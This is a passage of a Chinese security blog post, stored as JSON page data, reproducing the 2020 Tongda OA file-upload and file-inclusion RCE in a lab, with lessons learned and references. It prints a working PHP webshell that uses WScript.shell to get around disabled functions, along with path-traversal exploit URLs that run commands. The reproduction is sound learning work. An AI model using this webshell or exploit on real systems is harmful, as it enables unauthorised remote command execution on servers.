data-language=\"url\"><code class=\"language-url\">http:&#x2F;&#x2F;192.168.0.109&#x2F;ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;%22url%22:&quot;module&#x2F;..&#x2F;..&#x2F;attach&#x2F;im&#x2F;2004&#x2F;30022247.webshell.php&quot;&#125;&amp;cmd&#x3D;whoami<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>试着去RCE但是很可惜，并没有成功，虽然上传了webshell，但是却无法执行。这可能是存在过滤问题。所以我也去了解了一下。</p>\n<p><strong>通达OA开启了 disable_funcation 功能 很多常见的命令执行函数如 exec、eval、system等都被禁止了</strong></p>\n<p>所以我应该去重新构建一个webshell，或者找到一个bypass方式。</p>\n<p>我重新上传了一个webshell：<code>2050173889.hah.php</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$command</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$wsh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">COM</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'WScript.shell'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$exec</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$wsh</span><span class=\"token operator\">-></span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd /c \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$stdout</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$exec</span><span class=\"token operator\">-></span><span class=\"token function\">StdOut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$stroutput</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$stdout</span><span class=\"token operator\">-></span><span class=\"token function\">ReadAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$stroutput</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>构造一个新的json：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;192.168.0.109&#x2F;ispirit&#x2F;interface&#x2F;gateway.php?json&#x3D;&#123;%22url%22:&quot;module&#x2F;..&#x2F;..&#x2F;attach&#x2F;im&#x2F;2004&#x2F;2050173889.hah.php&quot;&#125;&amp;cmd&#x3D;whoami<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>成功执行了whoami</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200421104636.png\" alt=\"whoami执行\"></p>\n<p>接下来再试一下dir命令：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200421104619.png\" alt=\"dir成功执行\"></p>\n<p>复现成功了，第一次复现看了很多教程还是遇到了很多的问题。</p>\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>1、漏洞文件，再复现之前对于存在漏洞的软件安装程序的收集工作很重要，只有一个完整的漏洞版本程序对于复现来说才是最佳的。虽然某些文件存在漏洞，但是软件是一个整体，还包含了很多其他函数的调用。版本升级必然会带来其他代码的修改。从而影响复现效果。</p>\n<p>2、注意漏洞软件再联网状态下的自动更新情况，这次做复现就遇到了这个情况，因为某些原因，手上的工作停了一会。结果就触发了软件基本都会有的闲时自动更新功能，导致我回来后，漏洞消失了，确实困扰了我好久。起初一直以为是自己构造或者传值有问题，但是反复检查并没有问题。好在我马上反应到可能存在自动更新覆盖漏洞版本的情况，所以就去检查了一下版本号，果然从11.3升级到了11.5。</p>\n<p>3、在执行RCE的时候，我起初一直使用的是简单的一句话木马，但是一直没有RCE成功，这就让我很懵了。不知所措，于是更换了多个一句话木马，例如eval、system等，但是均无效果。于是试着了去网络上查询相关信息，果然查到了通达OA有做一些处理。</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p>1、<a href=\"https://www.cnblogs.com/-qing-/p/10944118.html\">https://www.cnblogs.com/-qing-/p/10944118.html</a></p>\n<p>2、<a href=\"https://www.freebuf.com/column/230871.html\">https://www.freebuf.com/column/230871.html</a></p>\n<p>3、<a href=\"https://xz.aliyun.com/t/7433\">https://xz.aliyun.com/t/7433</a></p>\n","text":"今年3月份通达OA爆出了文件上传和文件包含漏洞，网络上很多复现和分析的博客，今天我也来试着分析分析，据360灵腾安全实验室判断该漏洞等级为高，利用难度低，威胁程度高，所以可能比较适合代码审计的新手来练练。 0x00 漏洞概述通达OA（Office Anywhere网络智能办公系统...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":35,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","count":3,"path":"api/tags/漏洞分析.json"},{"name":"RCE","slug":"RCE","count":3,"path":"api/tags/RCE.json"},{"name":"文件上传","slug":"文件上传","count":2,"path":"api/tags/文件上传.json"},{"name":"代码审计","slug":"代码审计","count":2,"path":"api/tags/代码审计.json"},{"name":"通达OA","slug":"通达OA","count":2,"path":"api/tags/通达OA.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0\"><span class=\"toc-text\">0x00 漏洞概述</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">0x01 任意文件上传</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">0x02 文件包含漏洞</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">问题</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99\"><span class=\"toc-text\">参考资料</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"CTFHub技能树之WEB","date":"2020-04-22T06:35:35.000Z","updated":"2020-09-28T14:13:44.000Z","comments":true,"path":"api/articles/CTFHub技能树之WEB.json","keywords":"A1andNS","cover":[],"text":"技能树继续刚。 0x01 整数型注入 一个SQL整数型注入的大标题，还给出了执行语句是什么。这里我按他的步骤输入了一个1，他进行了select * from news where id=1查询，也给出了ID和Data。 我现在还是按流程来，判断一下是否存在注入点。 通过and 1...","link":"","photos":[],"count_time":{"symbolsCount":"8.1k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":43,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"SQL注入","slug":"SQL注入","count":3,"path":"api/tags/SQL注入.json"},{"name":"XSS","slug":"XSS","count":3,"path":"api/tags/XSS.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Cookie注入练习题","uid":"6bb2202be349e1d43d125b9c1b0ff943","slug":"Cookie注入练习题","date":"2020-04-17T12:09:30.000Z","updated":"2020-04-18T01:35:14.000Z","comments":true,"path":"api/articles/Cookie注入练习题.json","keywords":"A1andNS","cover":[],"text":"最近做了一题Cookie注入的题目 这是一题cookie注入的练习题，出自BSidesCF 2019]Sequel，这里用BUUOJ来做。 爆破得到username为guest，password为guest 登陆进去 看到一个电影数据库，其他什么都没有看看网页源码和HTTP请求内...","link":"","photos":[],"count_time":{"symbolsCount":"1.4k","symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":43,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"SQL注入","slug":"SQL注入","count":3,"path":"api/tags/SQL注入.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}